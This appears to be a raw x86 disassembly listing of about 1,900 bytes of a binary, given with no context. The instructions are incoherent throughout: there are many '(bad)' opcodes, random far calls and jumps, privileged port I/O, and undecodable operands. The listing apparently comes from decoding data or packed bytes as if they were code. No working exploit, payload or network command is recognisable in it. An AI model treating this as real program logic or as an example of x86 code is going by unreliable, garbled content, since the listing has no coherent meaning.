  44b883:	(bad)  
  44b884:	adc    BYTE PTR [eax],ah
  44b886:	(bad)
  44b88b:	scas   al,BYTE PTR es:[edi]
  44b88c:	pop    eax
  44b88d:	in     eax,dx
  44b88e:	push   ds
  44b88f:	jno    0x44b820
  44b891:	push   ecx
  44b892:	ins    DWORD PTR es:[edi],dx
  44b893:	xor    al,0xc9
  44b895:	xor    eax,0x2ceeb24b
  44b89a:	inc    esp
  44b89b:	dec    ebp
  44b89c:	mov    DWORD PTR [edx-0x4676da40],edi
  44b8a2:	ficom  WORD PTR [ecx-0x7ad0b79c]
  44b8a8:	push   ds
  44b8a9:	loope  0x44b8ae
  44b8ab:	aam    0xc6
  44b8ad:	lahf   
  44b8ae:	xchg   ebp,eax
  44b8af:	fiadd  DWORD PTR [ebx-0x7947437c]
  44b8b5:	aad    0xe7
  44b8b7:	adc    eax,0xd4352840
  44b8bc:	ja     0x44b8a2
  44b8be:	cmp    DWORD PTR [eax+eiz*1+0x2],ebp
  44b8c2:	js     0x44b84f
  44b8c4:	aad    0xa6
  44b8c6:	hlt    
  44b8c7:	clc    
  44b8c8:	xchg   ebp,eax
  44b8c9:	or     DWORD PTR [edi],ebx
  44b8cb:	sub    DWORD PTR [eax],esp
  44b8cd:	not    BYTE PTR [bx+di]
  44b8d0:	cmp    eax,0x4879c444
  44b8d5:	jecxz  0x44b893
  44b8d7:	aad    0x29
  44b8d9:	and    al,0x48
  44b8db:	sar    ecx,0xc0
  44b8de:	pop    ds
  44b8df:	imul   ebx,DWORD PTR [esi-0x17aa7312],0x85d4d70d
  44b8e9:	push   esp
  44b8ea:	cmp    dh,0x15
  44b8ed:	push   es
  44b8ee:	sbb    cl,BYTE PTR [edi-0x77]
  44b8f1:	leave  
  44b8f2:	sub    al,0xd2
  44b8f4:	mov    edx,0xea6d45bc
  44b8f9:	or     al,0x1d
  44b8fb:	cwde   
  44b8fc:	jle    0x44b893
  44b8fe:	loope  0x44b952
  44b900:	push   ebp
  44b901:	xchg   esi,eax
  44b902:	cmc    
  44b903:	test   al,bl
  44b905:	(bad)  
  44b906:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  44b908:	jge    0x44b97c
  44b90a:	pop    ds
  44b90b:	xlat   BYTE PTR ds:[ebx]
  44b90c:	into   
  44b90d:	push   ss
  44b90e:	sub    DWORD PTR [edx],ecx
  44b910:	add    cl,dh
  44b912:	mov    bh,0xd4
  44b914:	ffreep st(5)
  44b916:	pop    es
  44b917:	call   0xf88:0xd33e973f
  44b91e:	retf   0xe184
  44b921:	jle    0x44b97b
  44b923:	retf   
  44b924:	test   BYTE PTR [eax],al
  44b926:	push   0xfffffffd
  44b928:	sbb    al,0x67
  44b92a:	jb     0x44b8bf
  44b92c:	push   0x9bbdfaf3
  44b931:	dec    ebp
  44b932:	sub    esi,DWORD PTR [esi]
  44b934:	in     al,dx
  44b935:	add    eax,0x47742204
  44b93a:	pop    ebp
  44b93b:	fwait
  44b93c:	icebp  
  44b93d:	hlt    
  44b93e:	(bad)  
  44b93f:	push   ebp
  44b940:	fwait
  44b941:	sub    ah,BYTE PTR [edi]
  44b943:	(bad)  
  44b944:	mov    ds:0xb7b01ae4,al
  44b949:	in     eax,0x93
  44b94b:	push   edi
  44b94c:	mov    cl,0x69
  44b94e:	fmul   QWORD PTR [eax+0x15]
  44b951:	cmp    BYTE PTR es:[edx],0x84
  44b955:	inc    ebp
  44b956:	fst    QWORD PTR [esi]
  44b958:	mov    ds:0x91abecf9,al
  44b95d:	ins    BYTE PTR es:[edi],dx
  44b95e:	into   
  44b95f:	pop    esp
  44b960:	arpl   WORD PTR [edx-0x55],ax
  44b963:	sbb    esp,DWORD PTR [edi+0x49e91e45]
  44b969:	js     0x44b92e
  44b96b:	hlt    
  44b96c:	cmovs  eax,DWORD PTR ds:0x6d8d8f41
  44b973:	aaa    
  44b974:	push   edi
  44b975:	es in  al,0x74
  44b978:	imul   ecx,DWORD PTR [edi-0x4e],0x293f83d2
  44b97f:	sar    esp,cl
  44b981:	or     eax,0xbe06d60
  44b986:	or     BYTE PTR [esi],dl
  44b988:	arpl   WORD PTR [ebx],ax
  44b98a:	(bad)  
  44b98b:	mov    cl,BYTE PTR [ebp+0x50]
  44b98e:	cld    
  44b98f:	(bad)  
  44b990:	in     al,dx
  44b991:	dec    ebp
  44b992:	jnp    0x44b9f3
  44b994:	mov    ds:0x2b78bf78,eax
  44b999:	add    esp,DWORD PTR [edi+0x2becca54]
  44b99f:	test   eax,0xb717b78b
  44b9a4:	xchg   ebx,eax
  44b9a5:	daa    
  44b9a6:	call   0x80fa:0xdd17c96e
  44b9ad:	sbb    DWORD PTR [esi],ebx
  44b9af:	cmp    eax,0x3dbda0f5
  44b9b4:	cli    
  44b9b5:	dec    edi
  44b9b6:	mov    ch,0xd5
  44b9b8:	int3   
  44b9b9:	mov    edi,0xad7771a2
  44b9be:	mov    ah,0xad
  44b9c0:	mov    DWORD PTR [ecx+0x68],ecx
  44b9c3:	jne    0x44b94e
  44b9c5:	jp     0x44ba44
  44b9c7:	push   0xd4a5f8de
  44b9cc:	bound  edi,QWORD PTR [eax]
  44b9ce:	inc    ecx
  44b9cf:	inc    ebp
  44b9d0:	(bad)  
  44b9d1:	push   ecx
  44b9d2:	add    bl,BYTE PTR [ebx]
  44b9d4:	jo     0x44b9c2
  44b9d6:	pop    esi
  44b9d7:	iret   
  44b9d8:	jns    0x44ba4b
  44b9da:	call   0x9ea4787f
  44b9df:	jp     0x44ba05
  44b9e1:	(bad)  
  44b9e2:	jecxz  0x44b9b8
  44b9e4:	test   al,0x2a
  44b9e6:	xor    DWORD PTR [ecx-0x5050f1d6],esp
  44b9ec:	xchg   ebp,eax
  44b9ed:	pop    DWORD PTR [ebp+ebx*1+0x5047c297]
  44b9f4:	ins    BYTE PTR es:[edi],dx
  44b9f5:	mov    cl,0x97
  44b9f7:	aad    0x48
  44b9f9:	call   0x3f4f3be7
  44b9fe:	nop
  44b9ff:	dec    esi
  44ba00:	mov    BYTE PTR [ebp+0x4c],cl
  44ba03:	cs add al,0xa7
  44ba06:	xor    DWORD PTR [edi-0x40498ebf],0x622f4388
  44ba10:	mov    esp,DWORD PTR [edi]
  44ba12:	into   
  44ba13:	adc    al,0xc5
  44ba15:	push   ebx
  44ba16:	mov    ds:0xe26088a1,eax
  44ba1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ba1c:	and    BYTE PTR [edx+eax*2],bl
  44ba1f:	rcl    BYTE PTR [eax-0x7b06b8bf],cl
  44ba25:	inc    ebp
  44ba26:	scas   al,BYTE PTR es:[edi]
  44ba27:	call   0x676445b8
  44ba2c:	pop    edx
  44ba2d:	lods   eax,DWORD PTR ds:[esi]
  44ba2e:	dec    ecx
  44ba2f:	mov    dl,0x16
  44ba31:	and    ebx,DWORD PTR [eax]
  44ba33:	xlat   BYTE PTR ds:[ebx]
  44ba34:	sar    BYTE PTR [edi+0x469b1288],cl
  44ba3a:	jb     0x44bab0
  44ba3c:	mov    DWORD PTR [edi],esp
  44ba3e:	push   cs
  44ba3f:	dec    esi
  44ba40:	inc    edx
  44ba41:	and    esp,edi
  44ba43:	stc    
  44ba44:	and    BYTE PTR [ebx],al
  44ba46:	mov    dl,BYTE PTR [ebx-0x465ca3c]
  44ba4c:	enter  0xc0bc,0x1f
  44ba50:	sti    
  44ba51:	fsub   QWORD PTR [edi]
  44ba53:	mov    ds:0xc96dc46c,eax
  44ba58:	jp     0x44ba34
  44ba5a:	psubsb mm5,QWORD PTR [eax]
  44ba5d:	cmp    cl,bh
  44ba5f:	fadd   QWORD PTR [ecx+0x3]
  44ba62:	adc    al,BYTE PTR [esi]
  44ba64:	xor    eax,0xf7a6b7
  44ba69:	and    BYTE PTR [edi],bl
  44ba6b:	test   DWORD PTR [ebp-0x359c7e0a],ecx
  44ba71:	jae    0x44ba45
  44ba73:	aad    0x7e
  44ba75:	lods   al,BYTE PTR ds:[esi]
  44ba76:	and    eax,0x8b456709
  44ba7b:	mov    cl,0x88
  44ba7d:	gs sub eax,0x9771c775
  44ba83:	cmp    al,BYTE PTR fs:[edx]
  44ba86:	repnz mov eax,ds:0x799825d0
  44ba8c:	mov    ecx,0x8b6914d6
  44ba91:	fild   WORD PTR [ecx+0x4e]
  44ba94:	mov    dl,0x8
  44ba96:	jmp    0x4d5a:0xe28f696e
  44ba9d:	dec    edx
  44ba9e:	pop    ds
  44ba9f:	cmp    DWORD PTR [edx+eiz*8+0x53b02286],ecx
  44baa6:	push   ds
  44baa7:	xchg   ebp,eax
  44baa8:	inc    ebx
  44baa9:	or     al,0x8b
  44baab:	sub    eax,0xd4cf3826
  44bab0:	push   0x9a08049a
  44bab5:	ds out dx,eax
  44bab7:	in     al,0xf0
  44bab9:	xor    al,0x1f
  44babb:	dec    edi
  44babc:	mov    ebp,cs
  44babe:	(bad)  
  44bac0:	outs   dx,DWORD PTR ds:[esi]
  44bac1:	add    ch,BYTE PTR [eax]
  44bac3:	(bad)  
  44bac4:	hlt    
  44bac5:	stos   BYTE PTR es:[edi],al
  44bac6:	sbb    al,0xff
  44bac8:	ret    0x1f39
  44bacb:	frstor [eax+0x6cb58790]
  44bad1:	adc    eax,0x323dd709
  44bad6:	inc    eax
  44bad7:	prefetch BYTE PTR [ecx+0x33]
  44badb:	js     0x44ba66
  44badd:	push   ebp
  44bade:	outs   dx,DWORD PTR ds:[esi]
  44badf:	jl     0x44ba85
  44bae1:	out    dx,al
  44bae2:	mov    esp,fs
  44bae4:	cmp    DWORD PTR [edx],eax
  44bae6:	add    al,0x36
  44bae8:	xchg   edi,eax
  44bae9:	add    eax,0x9e46631d
  44baee:	fs test eax,0x1421e5a3
  44baf4:	jp     0x44bab9
  44baf6:	cld    
  44baf7:	jg     0x44bb50
  44baf9:	add    al,BYTE PTR [edx-0x6f]
  44bafc:	outs   dx,DWORD PTR ds:[esi]
  44bafd:	push   ebp
  44bafe:	stos   DWORD PTR es:[edi],eax
  44baff:	xor    ebx,0x3c7d6c01
  44bb05:	dec    eax
  44bb06:	sub    DWORD PTR [edx-0x5a],edx
  44bb09:	jl     0x44bb49
  44bb0b:	mov    ch,0x23
  44bb0d:	enter  0x46b8,0xcf
  44bb11:	jg     0x44bb80
  44bb13:	sbb    al,0xae
  44bb15:	jmp    0x44bb46
  44bb17:	xchg   edi,eax
  44bb18:	jp     0x44bb41
  44bb1a:	pop    es
  44bb1b:	rol    DWORD PTR [esi-0x4daf92fd],cl
  44bb21:	push   esi
  44bb22:	(bad)  
  44bb23:	jecxz  0x44baad
  44bb25:	xchg   edx,eax
  44bb26:	(bad)  
  44bb27:	aam    0x3e
  44bb29:	sbb    dl,dh
  44bb2b:	pop    ebp
  44bb2c:	loop   0x44bb37
  44bb2e:	mov    eax,ds:0x8cc9863c
  44bb33:	mov    ?,WORD PTR [esi]
  44bb35:	cmp    bh,BYTE PTR ds:0x59ad0e9b
  44bb3b:	xor    eax,0x929b5266
  44bb40:	ret    
  44bb41:	add    bh,dh
  44bb43:	push   ebx
  44bb44:	call   0xd725:0xad2fa9d
  44bb4b:	or     BYTE PTR fs:[edi+0x22085d62],ch
  44bb52:	fcom   st(6)
  44bb54:	leave  
  44bb55:	lea    ebp,[ebx]
  44bb57:	pop    eax
  44bb58:	mov    dh,0x90
  44bb5a:	pop    eax
  44bb5b:	xor    al,0x3a
  44bb5d:	pop    esp
  44bb5e:	push   ds
  44bb5f:	icebp  
  44bb60:	(bad)  
  44bb61:	lock stos BYTE PTR es:[edi],al
  44bb63:	mov    al,ds:0xd4322496
  44bb68:	test   eax,0x42c9a626
  44bb6d:	push   cs
  44bb6e:	outs   dx,BYTE PTR ds:[esi]
  44bb6f:	push   edx
  44bb70:	mov    ebp,ecx
  44bb72:	pop    ebp
  44bb73:	jne    0x44bb45
  44bb75:	xor    al,0xdf
  44bb77:	retf   0x580
  44bb7a:	pop    eax
  44bb7b:	in     eax,dx
  44bb7c:	sub    dl,al
  44bb7e:	sti    
  44bb7f:	ficomp WORD PTR [esi]
  44bb81:	sbb    eax,0x7188a204
  44bb86:	xchg   BYTE PTR [ebp-0x363c39b],al
  44bb8c:	push   eax
  44bb8d:	jmp    DWORD PTR [edi-0x3764142b]
  44bb93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bb94:	xor    esi,DWORD PTR [eax-0x3e7f1d14]
  44bb9a:	jl     0x44bb58
  44bb9c:	cdq    
  44bb9d:	aad    0xe0
  44bb9f:	test   al,0x9e
  44bba1:	lods   eax,DWORD PTR ds:[esi]
  44bba2:	ins    BYTE PTR es:[edi],dx
  44bba3:	aam    0x72
  44bba5:	mov    DWORD PTR [ecx+0x21ea1a4b],0xf30b892a
  44bbaf:	cmp    BYTE PTR [ecx],0x2a
  44bbb2:	test   BYTE PTR ds:0x4fb22774,ah
  44bbb8:	add    eax,0x9ef71e41
  44bbbd:	xchg   edi,eax
  44bbbe:	jae    0x44bc17
  44bbc0:	xchg   ebx,ebp
  44bbc2:	pop    ss
  44bbc3:	jle    0x44bc2d
  44bbc5:	dec    eax
  44bbc6:	les    esp,FWORD PTR [edi+0x7a5355ec]
  44bbcc:	add    BYTE PTR [edx+ebp*1],bl
  44bbcf:	mov    ebp,0x1633ef91
  44bbd4:	mov    ch,bh
  44bbd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bbd7:	test   eax,0xf8315b09
  44bbdc:	scas   al,BYTE PTR es:[edi]
  44bbdd:	dec    edx
  44bbde:	int3   
  44bbdf:	add    al,0xe
  44bbe1:	add    dh,BYTE PTR [ebp+ecx*1-0x6]
  44bbe5:	sub    cl,al
  44bbe7:	jp     0x44bb72
  44bbe9:	mov    cl,0x3f
  44bbeb:	adc    ecx,DWORD PTR [edi+0x23]
  44bbee:	mov    ah,0xf2
  44bbf0:	push   esp
  44bbf1:	ret    0xecb1
  44bbf4:	leave  
  44bbf5:	xchg   ebp,eax
  44bbf6:	cld    
  44bbf7:	mov    bh,0xf6
  44bbf9:	mov    edi,0xaa9abcd
  44bbfe:	aam    0xcf
  44bc00:	call   0x608037af
  44bc05:	add    dl,BYTE PTR [esp+ecx*2]
  44bc08:	push   esp
  44bc09:	int    0x6b
  44bc0b:	nop
  44bc0c:	and    BYTE PTR ds:0xf0c87d44,ah
  44bc12:	pusha  
  44bc13:	push   edi
  44bc14:	mov    dl,BYTE PTR [edi]
  44bc16:	inc    edi
  44bc17:	mov    ds:0xe53c02c0,eax
  44bc1c:	imul   edi,DWORD PTR [ebp-0x39c1f8bc],0x1f
  44bc23:	xchg   ebp,eax
  44bc24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bc25:	cmc    
  44bc26:	push   esi
  44bc27:	aaa    
  44bc28:	loope  0x44bbd6
  44bc2a:	int    0xde
  44bc2c:	and    DWORD PTR [ebx],eax
  44bc2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bc2f:	adc    ebp,0x305969dc
  44bc35:	push   edx
  44bc36:	not    DWORD PTR fs:[edi+0x3af91ee8]
  44bc3d:	add    esp,0x34
  44bc40:	jg     0x44bc44
  44bc42:	les    ebp,FWORD PTR [ecx-0x46]
  44bc45:	xlat   BYTE PTR ds:[ebx]
  44bc46:	xor    DWORD PTR [esi-0x1d],esp
  44bc49:	jns    0x44bbe0
  44bc4b:	mov    esi,DWORD PTR [eax]
  44bc4d:	add    edx,ebx
  44bc4f:	cli    
  44bc50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bc51:	xchg   DWORD PTR [eax-0x19b9c53c],ebx
  44bc57:	xor    dh,ch
  44bc59:	add    eax,0x145bb887
  44bc5e:	lahf   
  44bc5f:	ficom  DWORD PTR [eax]
  44bc61:	fidiv  DWORD PTR [esi-0x2c]
  44bc64:	ja     0x44bc79
  44bc66:	into   
  44bc67:	and    esp,ebp
  44bc69:	sub    BYTE PTR [edi-0x2e],0x38
  44bc6d:	(bad)  
  44bc6e:	psubd  mm4,QWORD PTR [ebp-0x7b]
  44bc72:	lock sbb bl,0xeb
  44bc76:	pusha  
  44bc77:	sub    DWORD PTR ds:0x437968c7,ebp
  44bc7d:	xor    BYTE PTR [ecx-0x563d7209],dl
  44bc83:	xor    eax,0xc98a2e8
  44bc88:	mov    DWORD PTR ds:0xc6d62334,ebp
  44bc8e:	ins    BYTE PTR es:[edi],dx
  44bc8f:	mov    cl,0x65
  44bc91:	add    ah,ah
  44bc93:	mov    esp,0xbab4927a
  44bc98:	inc    edi
  44bc99:	imul   esp,DWORD PTR [ebp-0x53],0xa
  44bc9d:	aam    0x5
  44bc9f:	mov    ds:0x7384c5a5,eax
  44bca4:	(bad)  
  44bca5:	out    0x5c,al
  44bca7:	leave  
  44bca8:	push   ss
  44bca9:	sbb    al,0xf6
  44bcab:	sub    edi,DWORD PTR [ebp+ebp*4+0x54]
  44bcaf:	sub    al,0x29
  44bcb1:	push   ebx
  44bcb2:	sub    cl,BYTE PTR [ecx+0x552ae588]
  44bcb8:	aaa    
  44bcb9:	fisubr DWORD PTR [ecx]
  44bcbb:	push   cs
  44bcbc:	dec    esi
  44bcbd:	ret    0xd5c4
  44bcc0:	(bad)  
  44bcc1:	in     al,dx
  44bcc2:	pop    ds
  44bcc3:	adc    BYTE PTR [ecx+ebp*2],bl
  44bcc6:	xlat   BYTE PTR ds:[ebx]
  44bcc7:	aas    
  44bcc8:	mov    DWORD PTR [edi],edi
  44bcca:	lock neg al
  44bccd:	lods   eax,DWORD PTR ds:[esi]
  44bcce:	mov    bl,0x3c
  44bcd0:	inc    ecx
  44bcd1:	add    esi,DWORD PTR [edx+0x4e0af6a1]
  44bcd7:	xchg   edx,eax
  44bcd8:	in     eax,0xf3
  44bcda:	pusha  
  44bcdb:	and    eax,0xf937b20a
  44bce0:	sub    eax,0xf2f24011
  44bce5:	add    dl,BYTE PTR [eax]
  44bce7:	fcomp  QWORD PTR [ebx]
  44bce9:	pusha  
  44bcea:	add    BYTE PTR [ebx+ecx*2-0x39269ed6],al
  44bcf1:	jecxz  0x44bcdf
  44bcf3:	sbb    bl,BYTE PTR [edi+0x64]
  44bcf6:	aas    
  44bcf7:	ja     0x44bd2a
  44bcf9:	adc    DWORD PTR [esi],ebx
  44bcfb:	enter  0x81fa,0x66
  44bcff:	call   0x86a4ad9b
  44bd04:	inc    edi
  44bd05:	not    DWORD PTR [ecx+esi*1+0x65a1032a]
  44bd0c:	(bad)  
  44bd0d:	lea    ecx,[edx-0x5d]
  44bd10:	stos   BYTE PTR es:[edi],al
  44bd11:	add    cl,al
  44bd13:	push   0x53
  44bd15:	pop    ss
  44bd16:	scas   eax,DWORD PTR es:[edi]
  44bd17:	(bad)  
  44bd18:	mov    edx,0x36c71c67
  44bd1d:	outs   dx,DWORD PTR ds:[esi]
  44bd1e:	adc    eax,0xcd618a2e
  44bd23:	mov    ebp,0xa8a42074
  44bd28:	dec    esi
  44bd29:	sbb    DWORD PTR [edi],ebx
  44bd2b:	mov    dh,0x24
  44bd2d:	push   cs
  44bd2e:	int3   
  44bd2f:	aam    0x1c
  44bd31:	pop    edi
  44bd32:	and    DWORD PTR [ecx],eax
  44bd34:	pop    es
  44bd35:	shr    DWORD PTR [ebx+0x24],1
  44bd38:	mov    BYTE PTR [ecx-0x7a],ch
  44bd3b:	add    dh,BYTE PTR [ebx+ebx*2]
  44bd3e:	lods   al,BYTE PTR ds:[esi]
  44bd3f:	dec    eax
  44bd40:	add    al,0xf
  44bd42:	inc    eax
  44bd43:	aad    0x59
  44bd45:	mov    edx,0xe4c53a77
  44bd4a:	pop    esi
  44bd4b:	cmp    al,0xfc
  44bd4d:	cmp    eax,0xc09d5cc
  44bd52:	aas    
  44bd53:	pop    DWORD PTR [eax+0x7d4debd]
  44bd59:	sbb    DWORD PTR [eax+esi*4-0x18],ebp
  44bd5d:	dec    ecx
  44bd5e:	mov    ds:0xb3bfc0a,al
  44bd63:	aam    0x3f
  44bd65:	loopne 0x44bdd9
  44bd67:	cmp    al,0x7a
  44bd69:	adc    eax,0xd48dba76
  44bd6e:	pushf  
  44bd6f:	loope  0x44bda7
  44bd71:	sbb    bh,BYTE PTR ds:0x88833317
  44bd77:	fisttp DWORD PTR [ebx+0xea11e7d]
  44bd7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bd7e:	repz ficomp WORD PTR gs:[ecx-0x7b]
  44bd83:	aam    0x69
  44bd85:	clc    
  44bd86:	sub    edx,edx
  44bd88:	add    ah,BYTE PTR [ebx]
  44bd8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bd8b:	sahf   
  44bd8c:	clc    
  44bd8d:	and    eax,0x80d7d394
  44bd92:	mov    ch,0x59
  44bd94:	mov    esp,0x18d702
  44bd99:	add    eax,DWORD PTR [eax+0x23b89cc7]
  44bd9f:	ror    DWORD PTR [bp+0x1e],cl
  44bda3:	add    eax,0x148ee68e
  44bda8:	test   BYTE PTR [edi],0x96
  44bdab:	aam    0x97
  44bdad:	pop    ecx
  44bdae:	fstp   QWORD PTR [ecx]
  44bdb0:	xchg   ebx,eax
  44bdb1:	dec    eax
  44bdb2:	mov    ebx,0x9729885c
  44bdb7:	add    al,0x1d
  44bdb9:	lahf   
  44bdba:	inc    esi
  44bdbb:	into   
  44bdbc:	rol    BYTE PTR ds:0xac380e6c,0xf1
  44bdc3:	mov    ah,0x84
  44bdc5:	mov    eax,0x400d0b6b
  44bdca:	sbb    edi,esp
  44bdcc:	and    eax,0x1c9e4402
  44bdd1:	test   eax,0xe97b5569
  44bdd6:	add    BYTE PTR [edx+0xd8e6f89],ah
  44bddc:	lods   eax,DWORD PTR ds:[esi]
  44bddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bdde:	mov    sp,0x2ca
  44bde2:	mov    cl,BYTE PTR [edi]
  44bde4:	ret    0xe34a
  44bde7:	cmp    BYTE PTR [eax-0x15],bl
  44bdea:	pop    ds
  44bdeb:	retf   
  44bdec:	std    
  44bded:	and    ch,0x74
  44bdf0:	ret    
  44bdf1:	sti    
  44bdf2:	scas   eax,DWORD PTR es:[edi]
  44bdf3:	adc    al,0xa7
  44bdf5:	inc    edx
  44bdf6:	mov    ds,WORD PTR ds:0x644e1440
  44bdfc:	mov    cl,dh
  44bdfe:	xor    BYTE PTR ds:0x121e6885,ch
  44be04:	loope  0x44be6e
  44be06:	sbb    bh,al
  44be08:	fs dec ebx
  44be0a:	ins    BYTE PTR es:[edi],dx
  44be0b:	mov    ecx,esi
  44be0d:	daa    
  44be0e:	(bad)  
  44be0f:	stc    
  44be10:	into   
  44be11:	pop    edx
  44be12:	add    dl,bh
  44be14:	sbb    cl,al
  44be16:	pop    ebp
  44be17:	arpl   sp,cx
  44be19:	out    dx,eax
  44be1a:	inc    esp
  44be1b:	(bad)  
  44be1c:	mov    BYTE PTR [edi-0x51],al
  44be1f:	popa   
  44be20:	mov    esp,0xb9ad8caa
  44be25:	add    cl,BYTE PTR [ecx+ecx*1+0x37]
  44be29:	sbb    BYTE PTR [eax+0x75],cl
  44be2c:	or     al,BYTE PTR [ecx+0x48a0ed5b]
  44be32:	push   ds
  44be33:	sub    al,0x32
  44be35:	lods   eax,DWORD PTR ds:[esi]
  44be36:	mov    WORD PTR [ebx],es
  44be38:	scas   eax,DWORD PTR es:[edi]
  44be39:	add    eax,0xd8755a62
  44be3e:	jmp    FWORD PTR ds:0x1b1e6d2d
  44be44:	push   ecx
  44be45:	inc    eax
  44be46:	jp     0x44be7a
  44be48:	loop   0x44be2b
  44be4a:	add    BYTE PTR [edi+edi*4-0x3911052e],ch
  44be51:	add    ebp,DWORD PTR [ebp+0x30aac213]
  44be57:	hlt    
  44be58:	mov    DWORD PTR [ebp-0x40],edx
  44be5b:	clc    
  44be5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44be5d:	xchg   ebp,eax
  44be5e:	lahf   
  44be5f:	pop    ss
  44be60:	addr16 sbb al,0x98
  44be63:	cmp    eax,0x690b037
  44be68:	outs   dx,BYTE PTR ds:[esi]
  44be69:	(bad)  
  44be6b:	outs   dx,BYTE PTR ds:[esi]
  44be6c:	pop    ecx
  44be6d:	lods   al,BYTE PTR ds:[esi]
  44be6e:	pusha  
  44be6f:	mov    ds:0x903ea5b,eax
  44be74:	stos   BYTE PTR es:[edi],al
  44be75:	cdq    
  44be76:	and    eax,0xedcd01d6
  44be7b:	or     al,0xe6
  44be7d:	sbb    BYTE PTR ds:0x67cec02f,al
  44be83:	std    
  44be84:	inc    ebp
  44be85:	dec    eax
  44be86:	jbe    0x44be7c
  44be88:	push   edi
  44be89:	add    ebx,DWORD PTR [ebp-0x6c9cd2f1]
  44be8f:	mov    ds:0xdd4b000f,eax
  44be94:	test   DWORD PTR [ebx-0x70],edi
  44be97:	retf   0x9b72
  44be9a:	and    BYTE PTR [ecx],dl
  44be9c:	fild   DWORD PTR [edi-0x4476de41]
  44bea2:	mov    ?,WORD PTR [ebp-0x3a]
  44bea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bea6:	xor    BYTE PTR ds:0xc527e062,cl
  44beac:	imul   ebx,DWORD PTR [edi],0x6189f816
  44beb2:	push   ds
  44beb3:	(bad)  
  44beb4:	lods   al,BYTE PTR ds:[esi]
  44beb5:	or     eax,0x3481670f
  44beba:	dec    esi
  44bebb:	or     dl,BYTE PTR [edi-0x77e165dc]
  44bec1:	fdivp  st(3),st
  44bec3:	scas   eax,DWORD PTR es:[edi]
  44bec4:	dec    ebp
  44bec5:	(bad)  
  44bec6:	popa   
  44bec7:	cmc    
  44bec8:	mov    edx,0x7683a7ea
  44becd:	sub    eax,0x567f339e
  44bed2:	nop
  44bed3:	push   0xd4c8c826
  44bed8:	xchg   esp,eax
  44bed9:	dec    edx
  44beda:	push   0x20
  44bedc:	fdiv   DWORD PTR [edx+0x471a4f8f]
  44bee2:	mov    dh,0x12
  44bee4:	mov    DWORD PTR [eax-0x2007b9e],esi
  44beea:	stos   DWORD PTR es:[edi],eax
  44beeb:	fisubr DWORD PTR [edi-0x25]
  44beee:	hlt    
  44beef:	ins    DWORD PTR es:[edi],dx
  44bef0:	test   DWORD PTR [edi+0x34],esi
  44bef3:	fs js  0x44bef8
  44bef6:	push   0xffffffb4
  44bef8:	jp     0x44bf76
  44befa:	jbe    0x44bf1e
  44befc:	pusha  
  44befd:	(bad)  
  44befe:	clc    
  44beff:	lods   eax,DWORD PTR ds:[esi]
  44bf00:	or     dl,BYTE PTR ds:0x5ec53a3e
  44bf06:	jg     0x44beae
  44bf08:	or     bh,BYTE PTR [edi+0x523fd588]
  44bf0e:	dec    ebp
  44bf0f:	xor    eax,0x8fd29156
  44bf14:	mov    ah,BYTE PTR ds:0xe874aba9
  44bf1a:	mov    ebp,ebp
  44bf1c:	pop    eax
  44bf1d:	stc    
  44bf1e:	xchg   esp,eax
  44bf1f:	mov    ds:0xfe146742,eax
  44bf24:	cwde   
  44bf25:	xor    DWORD PTR [esi],esi
  44bf27:	xlat   BYTE PTR ds:[ebx]
  44bf28:	mov    edi,0x57678f41
  44bf2d:	fwait
  44bf2e:	add    ebx,DWORD PTR [ecx+0x486d5c7]
  44bf34:	xor    eax,0xa1db8d0a
  44bf39:	add    bl,BYTE PTR [edx-0x5f6ab553]
  44bf3f:	and    BYTE PTR [ebx-0x1b30e085],0x5c
  44bf46:	jp     0x44bf62
  44bf48:	or     BYTE PTR [esi],al
  44bf4a:	mov    eax,0x94547d4
  44bf4f:	mov    bh,0xd9
  44bf51:	arpl   WORD PTR ds:0x6d08f86f,bx
  44bf57:	shl    DWORD PTR [edx+0x34691827],1
  44bf5d:	xchg   ebp,eax
  44bf5e:	pop    ebp
  44bf5f:	pusha  
  44bf60:	or     BYTE PTR [ebx],ch
  44bf62:	xchg   esi,eax
  44bf63:	in     eax,dx
  44bf64:	xor    cl,BYTE PTR [edi]
  44bf66:	cli    
  44bf67:	aam    0xbe
  44bf69:	cmovnp edx,DWORD PTR [edx+0x4db750d3]
  44bf70:	mov    bh,0x19
  44bf72:	je     0x44bf73
  44bf74:	or     ch,ah
  44bf76:	xchg   edi,eax
  44bf77:	push   edx
  44bf78:	aam    0x15
  44bf7a:	lds    edi,FWORD PTR [esi+ecx*4+0x599a9a31]
  44bf81:	cwde   
  44bf82:	pusha  
  44bf83:	daa    
  44bf84:	mov    esi,0x1eb9a3f1
  44bf89:	add    al,0xbe
  44bf8b:	aad    0x43
  44bf8d:	mov    ecx,0x48178824
  44bf92:	push   ebp
  44bf93:	push   edx
  44bf94:	mov    DWORD PTR [ecx+0x60],edi
  44bf97:	xchg   esi,eax
  44bf99:	je     0x44bf9d
  44bf9b:	outs   dx,BYTE PTR ds:[esi]
  44bf9c:	mov    ebp,0xf395a402
  44bfa1:	push   ebx
  44bfa2:	mov    ?,ebx
  44bfa4:	adc    edx,ebx
  44bfa6:	pop    ds
  44bfa7:	test   eax,0x9c1ac109
  44bfac:	mov    esp,0xedd4d779
  44bfb1:	pusha  
  44bfb2:	fldcw  WORD PTR ds:0x580c1c29
  44bfb8:	mov    ebp,esp
  44bfba:	xlat   BYTE PTR ds:[ebx]
  44bfbb:	pop    DWORD PTR [edi]
  44bfbd:	mov    eax,ds:0x3a10536
  44bfc2:	les    edi,FWORD PTR [eax+0x32823527]
  44bfc8:	(bad)  
  44bfc9:	mov    ds:0x538934e4,al
  44bfce:	sar    BYTE PTR [edx],cl
  44bfd0:	loope  0x44bf68
  44bfd2:	push   es
  44bfd3:	dec    edi
  44bfd4:	or     BYTE PTR [eax],al
  44bfd6:	jbe    0x44bfff
  44bfd8:	data16 mov al,0x89
  44bfdb:	add    ecx,esi
